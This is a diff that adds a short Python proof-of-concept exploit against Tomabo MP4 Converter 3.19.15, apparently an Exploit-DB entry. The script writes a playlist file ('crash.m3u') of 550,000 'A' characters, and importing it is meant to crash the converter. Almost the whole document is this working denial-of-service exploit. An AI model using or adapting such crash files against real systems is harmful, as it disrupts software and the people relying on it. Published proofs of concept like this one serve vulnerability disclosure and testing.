@@ -1,0 +1,20 @@
+#!/usr/bin/python
+
+# Exploit Title: Tomabo MP4 Converter DOS
+# Date: 13/08/17
+# Exploit Author: Andy Bowden
+# Vendor Homepage: http://www.tomabo.com/
+# Software Link: http://www.tomabo.com/mp4-converter/index.html
+# Version: 3.19.15
+# Tested on: Windows 7 x86
+# CVE : None
+
+#Generate a .m3u file using the python script and import it into the MP4 Converter.
+
+file = "crash.m3u"
+
+buffer = "A" * 550000
+
+f = open(file, "w")
+f.write(buffer)
+f.close()
